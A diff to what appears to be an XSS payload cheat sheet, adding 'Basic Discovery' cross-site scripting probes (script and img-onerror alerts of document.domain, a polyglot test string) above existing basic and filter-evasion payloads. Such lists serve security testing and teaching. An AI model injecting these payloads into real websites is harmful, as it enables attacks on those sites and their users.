@@ -216,6 +216,11 @@ Most tools are also suitable for blind XSS attacks:
 ### Common Payloads
 
 ```javascript
+// Basic Discovery
+<script>alert(document.domain)</script> 
+<img src=x onerror='alert(document.domain)' /> 
+xX';!--"<XSS>=\&{()}<br />Xx
+
 // Basic payload
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
